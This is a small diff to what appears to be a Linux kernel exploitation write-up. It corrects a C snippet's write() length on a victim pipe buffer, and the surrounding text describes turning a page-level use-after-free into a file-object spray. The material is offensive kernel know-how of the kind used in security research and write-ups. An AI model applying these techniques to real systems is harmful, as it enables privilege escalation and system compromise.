@@ -879,7 +879,7 @@ this `struct page{c:}` via the victim `pipe_buffer`, giving us our UAF.
 ```c
 // now we have page-level uaf via victim
 // fill to the next file object
-write(pipe_buf_fds[victim][1], &buf[5], 0x);
+write(pipe_buf_fds[victim][1], &buf[5], 0x30);
 
 // spray a few more files, no need for a lot since we already drained the filp beforehand
 size_t final_file_spray = 0x200;
